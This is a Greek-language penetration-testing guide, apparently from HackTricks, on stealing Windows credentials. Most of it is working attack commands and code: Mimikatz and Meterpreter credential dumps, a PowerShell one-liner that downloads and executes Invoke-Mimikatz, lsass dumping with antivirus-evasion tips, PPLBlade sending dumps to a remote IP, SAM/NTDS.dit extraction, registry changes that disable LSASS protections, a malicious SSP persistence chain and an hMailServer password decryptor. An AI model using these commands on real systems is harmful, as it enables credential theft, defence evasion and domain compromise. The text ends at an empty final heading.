# Κλοπή διαπιστευτηρίων Windows

{{#include ../../banners/hacktricks-training.md}}

## Διαπιστευτήρια Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Μάθετε για ορισμένες πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να αποτρέψουν το Mimikatz από το να εξαγάγει ορισμένα διαπιστευτήρια.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** δημιούργησα για να **αναζητήσετε κωδικούς πρόσβασης και hashes** στο σύστημα του θύματος.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς το **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump της διεργασίας lsass**, **να κατεβάσετε το dump** και να **εξαγάγετε** τα **διαπιστευτήρια τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Αυτή η διαδικασία εκτελείται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Κάποια **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για dump του lsass.exe**, επειδή **ανιχνεύουν** τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο **stealthy** να **περάσετε** ως **argument** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dump του lsass με **comsvcs.dll**

Μια DLL με όνομα **comsvcs.dll**, που βρίσκεται στο `C:\Windows\System32`, είναι υπεύθυνη για το **dump της μνήμης μιας διεργασίας** σε περίπτωση crash. Αυτή η DLL περιλαμβάνει μια **function** με όνομα **`MiniDumpW`**, η οποία έχει σχεδιαστεί για να καλείται μέσω του `rundll32.exe`.\
Δεν έχει σημασία η χρήση των δύο πρώτων arguments, αλλά το τρίτο χωρίζεται σε τρία στοιχεία. Το ID της διεργασίας που θα γίνει dump αποτελεί το πρώτο στοιχείο, η τοποθεσία του dump file το δεύτερο και το τρίτο στοιχείο πρέπει να είναι ακριβώς η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Αφού γίνει parsing αυτών των τριών στοιχείων, η DLL δημιουργεί το dump file και μεταφέρει σε αυτό τη μνήμη της καθορισμένης διεργασίας.\
Η **comsvcs.dll** μπορεί να χρησιμοποιηθεί για dump της διεργασίας lsass, εξαλείφοντας έτσι την ανάγκη για upload και εκτέλεση του procdump. Η μέθοδος περιγράφεται λεπτομερώς στη διεύθυνση [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Για την εκτέλεση χρησιμοποιείται η ακόλουθη εντολή:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass με τη Διαχείριση Εργασιών**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και επιλέξτε «Διαχείριση Εργασιών»
2. Κάντε κλικ στην επιλογή «Περισσότερες λεπτομέρειες»
3. Αναζητήστε τη διεργασία «Local Security Authority Process» στην καρτέλα «Διεργασίες»
4. Κάντε δεξί κλικ στη διεργασία «Local Security Authority Process» και επιλέξτε «Δημιουργία αρχείου dump».

### Dumping lsass με το procdump

Το [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα δυαδικό αρχείο υπογεγραμμένο από τη Microsoft και αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Ένα υπάρχον dump πλήρους κατάρρευσης συστήματος ή ένα συμπιεσμένο αντίγραφό του σε προσβάσιμο φάκελο χρήστη ενδέχεται να διατηρεί διαπιστευτήρια για ανάλυση εκτός σύνδεσης. Ονόματα αρχείων όπως `MEMORY.DMP` και `MEMORY.7z` είναι μόνο ενδείξεις προς διερεύνηση: επαληθεύστε την προέλευση και την πρόσβαση και μην υποθέτετε ότι περιέχουν αξιοποιήσιμα ή τρέχοντα διαπιστευτήρια.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpin lsass με PPLBlade

Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο για την εξαγωγή dump από Protected Process, το οποίο υποστηρίζει την απόκρυψη του memory dump και τη μεταφορά του σε απομακρυσμένους σταθμούς εργασίας χωρίς να αποθηκεύεται στον δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη αρχείων memory dump για αποφυγή των μηχανισμών ανίχνευσης του Defender που βασίζονται σε signatures
3. Μεταφόρτωση memory dump με μεθόδους RAW και SMB χωρίς αποθήκευσή του στον δίσκο (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – απόρριψη LSASS μέσω SSP χωρίς MiniDumpWriteDump

Το Ink Dragon χρησιμοποιεί ένα dumper τριών σταδίων, με την ονομασία **LalsDumper**, το οποίο δεν καλεί ποτέ το `MiniDumpWriteDump`, επομένως δεν ενεργοποιούνται ποτέ τα EDR hooks σε αυτό το API:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – αναζητά στο `fdp.dll` ένα placeholder αποτελούμενο από 32 πεζούς χαρακτήρες `d`, το αντικαθιστά με την απόλυτη διαδρομή προς το `rtu.txt`, αποθηκεύει το τροποποιημένο DLL ως `nfdp.dll` και καλεί `AddSecurityPackageA("nfdp","fdp")`. Έτσι, το **LSASS** φορτώνει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 μέσα στο LSASS** – όταν το LSASS φορτώσει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, εφαρμόζει XOR σε κάθε byte με `0x20` και αντιστοιχίζει το αποκωδικοποιημένο blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το αντιστοιχισμένο payload επανυλοποιεί τη λογική MiniDump χρησιμοποιώντας **direct syscalls**, τα οποία επιλύονται από hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα ειδικό export με όνομα `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, γράφει ένα συμπιεσμένο dump του LSASS στο αρχείο και κλείνει το handle, ώστε να μπορεί να γίνει exfiltration αργότερα.

Σημειώσεις χειριστή:

* Διατηρήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο κατάλογο. Το Stage 1 αντικαθιστά το hard-coded placeholder με την απόλυτη διαδρομή προς το `rtu.txt`, επομένως ο διαχωρισμός τους διακόπτει την αλυσίδα.
* Η εγγραφή γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να προσθέσετε μόνοι σας αυτήν την τιμή, ώστε το LSASS να φορτώνει ξανά το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά και, στη συνέχεια, τροφοδοτήστε τα στο Mimikatz/Volatility για εξαγωγή διαπιστευτηρίων.
* Για να πετύχει η `AddSecurityPackageA`, η εκτέλεση του `lals.exe` απαιτεί δικαιώματα admin/SeTcb· μόλις επιστρέψει η κλήση, το LSASS φορτώνει διαφανώς το κακόβουλο SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από τον δίσκο δεν το εκφορτώνει από το LSASS. Διαγράψτε την καταχώριση μητρώου και επανεκκινήστε το LSASS (επανεκκίνηση του συστήματος) ή αφήστε το εκεί για μακροχρόνια persistence.

## CrackMapExec

### Εξαγωγή SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump του NTDS.dit από τον DC-στόχο

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Κάντε dump του ιστορικού κωδικών πρόσβασης του NTDS.dit από τον DC-στόχο

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Εμφάνιση του attribute pwdLastSet για κάθε λογαριασμό NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Κλοπή των SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στα _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Όμως **δεν μπορείτε απλώς να τα αντιγράψετε με τον συνηθισμένο τρόπο**, επειδή είναι προστατευμένα.

### Από το Registry

Ο ευκολότερος τρόπος να κλέψετε αυτά τα αρχεία είναι να λάβετε ένα αντίγραφό τους από το Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Κατεβάστε** αυτά τα αρχεία στον υπολογιστή σας με Kali και **εξαγάγετε τα hashes** χρησιμοποιώντας:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε διαχειριστής.

#### Using vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα του **πώς να αντιγράψετε το αρχείο SAM** (η μονάδα δίσκου που χρησιμοποιείται είναι η «C:» και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory** και περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εκεί αποθηκεύονται τα **hashes κωδικών πρόσβασης** των χρηστών του domain. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Σε αυτή τη βάση δεδομένων διατηρούνται τρεις κύριοι πίνακες:

- **Πίνακας δεδομένων**: Αυτός ο πίνακας αποθηκεύει λεπτομέρειες για αντικείμενα όπως χρήστες και ομάδες.
- **Πίνακας συνδέσεων**: Παρακολουθεί τις σχέσεις, όπως τις συμμετοχές σε ομάδες.
- **Πίνακας SD**: Εδώ αποθηκεύονται οι **περιγραφείς ασφαλείας** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης των αποθηκευμένων αντικειμένων.

Η έρευνα του Christoffer Andersson στο επίπεδο της βάσης δεδομένων τεκμηριώνει λεπτομερέστερα αυτούς τους πίνακες και τη συμπεριφορά τους ανά έκδοση.<sup>[[8]](#references)</sup>

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο, ενώ χρησιμοποιείται από το _lsass.exe_. Επομένως, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **στη μνήμη του `lsass`** (πιθανότατα, μπορείτε να βρείτε τα δεδομένα στα οποία έγινε πιο πρόσφατη πρόσβαση λόγω της βελτίωσης της απόδοσης μέσω χρήσης **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash κρυπτογραφείται τρεις φορές:

1. Αποκρυπτογραφήστε το Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή σε κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο **NTDS.dit** με το **BOOTKEY**, το οποίο είναι ειδικό για τον εκάστοτε DC και προέρχεται από την ομάδα **SYSTEM** αυτού του domain controller. Επομένως, για την εξαγωγή διαπιστευτηρίων απαιτούνται τόσο το **NTDS.dit** όσο και το **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Αντιγραφή του NTDS.dit με χρήση του Ntdsutil

Διαθέσιμο από τα Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Θα μπορούσατε επίσης να χρησιμοποιήσετε το κόλπο του [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Να θυμάστε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (και πάλι, χρησιμοποιήστε το κόλπο [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Μπορείτε επίσης να τα **εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Για **μεγάλα αρχεία NTDS.dit**, συνιστάται η εξαγωγή τους με το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων τομέα από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Εξάγονται όχι μόνο τα secrets, αλλά και ολόκληρα τα αντικείμενα μαζί με τα χαρακτηριστικά τους, ώστε να εξαχθούν περαιτέρω πληροφορίες, όταν έχει ήδη ανακτηθεί το ακατέργαστο αρχείο NTDS.dit.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Το hive `SYSTEM` είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (hashes NT & LM, συμπληρωματικά διαπιστευτήρια όπως κωδικοί πρόσβασης σε μορφή cleartext, κλειδιά kerberos ή trust, ιστορικά κωδικών πρόσβασης NT & LM). Μεταξύ άλλων πληροφοριών, εξάγονται τα εξής: λογαριασμοί χρηστών και μηχανημάτων με τα hashes τους, flags UAC, χρονική σήμανση τελευταίας σύνδεσης και αλλαγής κωδικού πρόσβασης, περιγραφές λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο οργανωτικών μονάδων και συμμετοχές, trusted domains με τον τύπο, την κατεύθυνση και τα χαρακτηριστικά των trusts...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξαγάγετε διαπιστευτήρια από διάφορα λογισμικά.

```
lazagne.exe all
```

## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Κατεβάστε το από:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το** για να εξαχθούν οι κωδικοί πρόσβασης.

## Εξόρυξη αδρανών συνεδριών RDP και αποδυνάμωση των ελέγχων ασφαλείας

Το FinalDraft RAT της Ink Dragon περιλαμβάνει ένα tasker `DumpRDPHistory`, οι τεχνικές του οποίου είναι χρήσιμες για κάθε red-teamer:<sup>[[3]](#references)</sup>

### Συλλογή τηλεμετρίας τύπου DumpRDPHistory

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε user hive στη διαδρομή `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε subkey αποθηκεύει το όνομα του server, το `UsernameHint` και τη χρονική σήμανση της τελευταίας εγγραφής. Μπορείτε να αναπαραγάγετε τη λογική του FinalDraft με PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ενδείξεις εισερχόμενου RDP** – αναζητήστε στο αρχείο καταγραφής `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` τα Event IDs **21** (επιτυχής σύνδεση) και **25** (αποσύνδεση), για να χαρτογραφήσετε ποιος διαχειρίστηκε το μηχάνημα:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Μόλις μάθετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) όσο η **αποσυνδεδεμένη** συνεδρία του εξακολουθεί να υπάρχει. Το CredSSP + η εναλλακτική χρήση NTLM αφήνουν το verifier και τα tokens του στο LSASS, όπου μπορούν στη συνέχεια να επαναχρησιμοποιηθούν μέσω SMB/WinRM για την απόκτηση του `NTDS.dit` ή για την εγκατάσταση persistence σε domain controllers.

### Υποβαθμίσεις μητρώου που στοχεύει το FinalDraft

Το ίδιο implant τροποποιεί επίσης αρκετά κλειδιά μητρώου, ώστε να διευκολύνει την κλοπή διαπιστευτηρίων:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` απενεργοποιεί το Restricted Admin για εισερχόμενες συνδέσεις RDP· **δεν** ενεργοποιεί το pass-the-hash μέσω αυτής της λειτουργίας. Η ορισμός της τιμής σε `0` επιτρέπει το Restricted Admin στον προορισμό, αλλά ο client πρέπει να ζητήσει `/RestrictedAdmin` ή να χρησιμοποιήσει μια πολιτική που απαιτεί το Restricted Admin.<sup>[[14]](#references)</sup> Ένα hash από μόνο του δεν παρέχει απομακρυσμένα δικαιώματα διαχειριστή· δείτε τα [RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το φιλτράρισμα token του UAC, ώστε οι τοπικοί διαχειριστές να αποκτούν μη περιορισμένα token μέσω δικτύου.
* `DSRMAdminLogonBehavior=2` επιτρέπει στον διαχειριστή DSRM να συνδέεται ενώ ο DC είναι σε λειτουργία, παρέχοντας στους επιτιθέμενους έναν ακόμη ενσωματωμένο λογαριασμό υψηλών δικαιωμάτων.
* `RunAsPPL=0` αφαιρεί τις προστασίες LSASS PPL, καθιστώντας την πρόσβαση στη μνήμη εύκολη για εργαλεία εξαγωγής dump, όπως το LalsDumper.

## Διαπιστευτήρια ρυθμίσεων hMailServer (μετά την παραβίαση)

Ελέγξτε τα ακριβή αρχεία ρυθμίσεων `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` και `C:\ProgramData\hMailServer\hMailServer.ini`, ανάλογα με τη διάταξη εγκατάστασης. Μια αναγνώσιμη, μη κενή τιμή `[Security] AdministratorPassword=` είναι hash κωδικού πρόσβασης διαχείρισης του hMailServer· δεν αποτελεί ένδειξη κωδικού πρόσβασης Windows Administrator. Αν ανακτηθεί αυτό το διαπιστευτήριο, οποιαδήποτε μετάβαση σε λογαριασμό Windows απαιτεί ανεξάρτητη επαλήθευση της επαναχρησιμοποίησης κωδικού πρόσβασης και των δικαιωμάτων σύνδεσης.

Για εγκαταστάσεις που χρησιμοποιούν βάση δεδομένων SQL CE, η ξεχωριστή τιμή `[Database] Password=` στο INI προστατεύει τη βάση δεδομένων. Σε παλαιότερες εγκαταστάσεις, αυτή η τιμή είναι κρυπτογραφημένη με Blowfish, χρησιμοποιώντας το στατικό κλειδί `THIS_KEY_IS_NOT_SECRET` και αντιμεταθέσεις endianness σε λέξεις των 4 byte. Χρησιμοποιήστε τη συμβολοσειρά hex από το INI με αυτό το απόσπασμα Python:<sup>[[2]](#references)</sup>

Επιβεβαιώστε πρώτα ότι ο τρέχων λογαριασμός μπορεί να διαβάσει **και** το INI **και** την αντίστοιχη βάση δεδομένων SQL CE `.sdf`. Ο κωδικός πρόσβασης του INI προστατεύει τη βάση δεδομένων· είναι ξεχωριστός από τα hash λογαριασμών mailbox που είναι αποθηκευμένα σε αυτήν. Ελέγχετε ή αναβαθμίζετε **αντίγραφο** μιας βάσης δεδομένων που χρησιμοποιείται· ποτέ το ενεργό αρχείο.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Με τον κωδικό πρόσβασης σε απλό κείμενο, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε κλειδώματα αρχείων, φορτώστε τον πάροχο 32-bit και κάντε αναβάθμιση αν χρειάζεται πριν αναζητήσετε hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Η στήλη `accountpassword` χρησιμοποιεί τη μορφή hash του hMailServer (λειτουργία `1421` του hashcat). Ένας κωδικός πρόσβασης mailbox που έχει γίνει crack δίνει δυνατότητα για pivot σε λογαριασμό χρήστη των Windows μόνο αν ο ίδιος κωδικός χρησιμοποιείται ξανά από έναν τοπικό λογαριασμό ή λογαριασμό domain και αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα απομακρυσμένης σύνδεσης.

## Υποκλοπή LSA Logon Callback (LsaApLogonUserEx2)

Ορισμένα εργαλεία καταγράφουν **κωδικούς πρόσβασης logon σε plaintext** παρεμβαίνοντας στο LSA logon callback `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrapper του callback του authentication package, ώστε τα credentials να καταγραφούν **κατά το logon** (πριν από το hashing) και, στη συνέχεια, να εγγραφούν στον δίσκο ή να επιστραφούν στον operator. Συνήθως υλοποιείται ως helper που κάνει inject στο LSA ή εγγράφεται σε αυτό και, στη συνέχεια, καταγράφει κάθε επιτυχημένο συμβάν interactive/network logon μαζί με το username, το domain και τον κωδικό πρόσβασης.<sup>[[1]](#references)</sup>

Σημειώσεις λειτουργίας:
- Απαιτούνται δικαιώματα local admin/SYSTEM για τη φόρτωση του helper στη διαδρομή authentication.
- Τα credentials καταγράφονται μόνο όταν συμβεί logon (interactive, RDP, service ή network logon, ανάλογα με το hook).

## Αποθηκευμένα Credentials Σύνδεσης SSMS (sqlstudio.bin)

